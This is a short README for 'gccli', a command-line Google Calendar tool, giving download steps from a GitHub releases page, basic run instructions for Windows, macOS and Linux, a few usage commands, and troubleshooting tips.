# 🎉 gccli - Simple Way to Manage Google Calendar

## 🚀 Getting Started

Welcome to gccli! This tool helps you manage your Google Calendar easily from the command line. No complex setups or installations are needed. Just follow these steps to get started.

## 📥 Download & Install

To download gccli, visit the following page:

[![Download gccli](https://img.shields.io/badge/Download-gccli-blue.svg)](https://github.com/alandesouzars/gccli/releases)

This link will take you to the Releases page, where you can find the latest version of gccli. 

### Steps to Download

1. Click on the link above to go to the Releases page.
2. Look for the version number that says "Latest Release."
3. Click on the version number to view the files available for download.
4. Download the file that matches your operating system.

Currently, gccli supports:
- Windows
- macOS
- Linux

### Running gccli

After downloading, follow these steps based on your operating system to run gccli.

**For Windows:**
1. Double-click on the downloaded `.exe` file.
2. A command prompt window will open.
3. Start using gccli by typing commands directly into the window.

**For macOS & Linux:**
1. Open your terminal.
2. Navigate to the folder where you downloaded the file.
3. Make the file executable by running: 
   ```bash
   chmod +x gccli
   ```
4. Run gccli by typing: 
   ```bash
   ./gccli
   ```

## 🔧 Usage Instructions

Once you have gccli running, you can use the following commands to manage your calendar.

### View Events

To see your upcoming events, type:

```
gccli view
```

### Add an Event

To add a new event, use the command below:

```
gccli add "Event Title" --date "YYYY-MM-DD" --time "HH:MM"
```

Replace `"Event Title"`, `"YYYY-MM-DD"`, and `"HH:MM"` with your details.

### Delete an Event

To remove an event, input:

```
gccli delete "Event Title"
```

### Help

For a complete list of commands, type:

```
gccli help
```

This will show you all available commands and how to use them.

## 📅 Features

- **Easy Event Management:** Quickly add, view, and delete events.
- **User-Friendly Commands:** Simple commands for anyone to use.
- **Cross-Platform:** Works on Windows, macOS, and Linux.

## 🌟 System Requirements

To run gccli smoothly, ensure your system meets the following requirements:

- **Operating System:**
  - Windows 10 or later
  - macOS 10.12 or later
  - Linux with kernel 4.0 and above

- **Dependencies:**
  - Python 3.6 or higher (included in the download)

## 🛠 Troubleshooting

If you encounter any issues while running gccli, consider the following tips:

1. **Check Download Integrity:**
   Ensure you downloaded the correct file for your operating system. If it doesn't start, try re-downloading.

2. **Permissions:**
   On macOS and Linux, make sure the file is executable. Use the `chmod +x` command as described earlier.

3. **Python Environment:**
   Ensure that Python is installed properly, especially for version compatibility.

## 💬 Feedback and Support

We welcome your feedback! If you have suggestions or questions, please submit an issue on the [GitHub Repository](https://github.com/alandesouzars/gccli/issues).

## 🌐 Further Reading

For more information, tutorials, and tips on how to maximize your use of gccli, check our Wiki section on the GitHub page under the "Wiki" tab.

[![Download gccli](https://img.shields.io/badge/Download-gccli-blue.svg)](https://github.com/alandesouzars/gccli/releases)

Happy calendaring with gccli!